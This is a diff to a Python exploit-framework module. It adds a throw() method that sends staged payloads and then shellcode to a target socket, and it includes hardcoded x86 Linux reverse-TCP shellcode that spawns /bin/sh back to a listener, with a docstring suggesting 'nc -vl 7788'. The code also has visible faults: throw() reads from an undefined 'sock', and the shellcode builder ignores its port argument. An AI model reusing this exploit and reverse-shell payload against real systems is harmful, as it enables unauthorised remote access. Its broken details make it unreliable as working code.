@@ -43,7 +43,13 @@ class Exploit():
         sys.stdout.write(repr(self.shellcode)[1:-1])
 
     def throw(self): # needs implementation
-        pass
+        connect = get_socket((self.ip, self.port)) 
+        for send in self.stage:
+            connect.send(send)
+            time.sleep(.5)
+            print sock.recv(0x10000)
+        connect.send(self.shellcode)
+
 
 def reverse_tcp(ip_addr, port, arch='x86'):
     '''
@@ -57,7 +63,7 @@ def reverse_tcp(ip_addr, port, arch='x86'):
     A command you could use to setup a listener on your system is 'nc -vl 7788'
     '''
     ip = ''.join([chr(int(x)) for x in ip_addr.split('.')])
-    port = struct.pack('>H', 7788)
+    port = pack('>H', 7788)
 
     REVERSE_TCP_X86 = (
         '\x31\xc0\x89\xc3\x50\x6a\x01\x6a\x02\x43\xb0\x66\x89\xe1\xcd\x80\x89\xc6'
@@ -65,7 +71,7 @@ def reverse_tcp(ip_addr, port, arch='x86'):
         '\x6a\x10\x51\x56\x43\x89\xe1\xcd\x80\x89\xc7\x31\xc9\x89\xc8\x89\xca\xb1'
         '\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f'
         '\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x89\xca\xcd\x80'
-    )
+        )
 
     if arch.lower() == 'x86':
         REVERSE_TCP = REVERSE_TCP_X86
